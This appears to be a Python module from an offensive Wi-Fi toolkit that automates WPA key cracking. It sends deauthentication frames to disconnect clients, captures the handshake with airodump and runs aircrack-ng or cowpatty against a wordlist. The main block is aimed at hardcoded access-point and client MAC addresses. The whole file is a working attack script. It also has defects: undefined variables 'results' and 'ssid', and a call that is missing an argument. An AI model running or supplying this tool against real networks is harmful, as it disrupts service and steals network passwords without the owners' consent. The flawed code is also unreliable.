from Viper.attack.deauth import deauth_broadcast, deauth_client
from Viper.util.channel import change_channel
from Viper.scan.dump import airodump


import subprocess
import os
import re


def wpa_crack(interface, number_of_deuath, ap_mac_address, c_mac, channel, directory, dictionary, seconds):
    pcapfile4way = os.path.join(directory, 'wpa')
    change_channel(interface, channel)
    ctr = 1
    while ctr < 4:
        if c_mac:
            deauth_client(interface, number_of_deuath, ap_mac_address, c_mac)
        deauth_broadcast(interface, number_of_deuath, ap_mac_address)
        airodump(interface, ap_mac_address, channel, pcapfile4way, seconds)
        second_command_wpa = subprocess.run(
            ['aircrack-ng', f'{pcapfile4way}-0{ctr}.cap'], capture_output=True, text=True)
        if re.search("\([1-9]+ handshake[s]?\)", second_command_wpa.stdout):
            third_command_wpa = subprocess.run(
                ['aircrack-ng', f'{pcapfile4way}-0{ctr}.cap', '-w', dictionary], capture_output=True, text=True)
            if 'KEY NOT FOUND' in third_command_wpa.stdout:
                return None
            else:
                password = re.findall(
                    "\[.*\]", third_command_wpa.stdout)[-1].split('FOUND! [ ')[-1][:-2]
                return password
        else:
            ctr += 1


def fast_wpa_crack(interface, number_of_deuath, ap_mac_address, c_mac, channel, directory, dictionary):

    pmkfile = os.path.join(results, 'pmkfile')
    first_command_wpa_fast = subprocess.run(
        ['sudo', 'genpmk', dictionary, '-d', pmkfile, '-s', ssid], capture_output=True, text=True)
    pcapfile4way = os.path.join(directory, 'wpa')
    change_channel(interface, channel)
    ctr = 1
    while ctr < 4:
        if c_mac:
            deauth_client(interface, number_of_deuath, ap_mac_address, c_mac)
        deauth_broadcast(interface, number_of_deuath, ap_mac_address)
        airodump(interface, ap_mac_address, channel, pcapfile4way)
        second_command_wpa = subprocess.run(
            ['aircrack-ng', f'{pcapfile4way}-0{ctr}.cap'], capture_output=True, text=True)
        if re.search("\([1-9]+ handshake[s]?\)", second_command_wpa.stdout):
            third_command_wpa = subprocess.run(
                ['sudo', 'cowpatty', '-d', pmkfile, '-s', ssid, '-r', f'{pcapfile4way}.pcap'], capture_output=True, text=True)
            print(third_command_wpa.stdout)
        else:
            ctr += 1


if __name__ == '__main__':
    ap_mac_address = '70:72:3C:C5:55:F3'
    interface = 'wlan0mon'
    c_mac = '7E:C9:59:3D:44:A0'
    channel = '11'
    dictionary = '/home/kali/Viper/ok.lst'
    directory = '/home/kali/Viper/results/'
    print(wpa_crack(interface, 10, ap_mac_address,
          c_mac, channel, directory, dictionary))
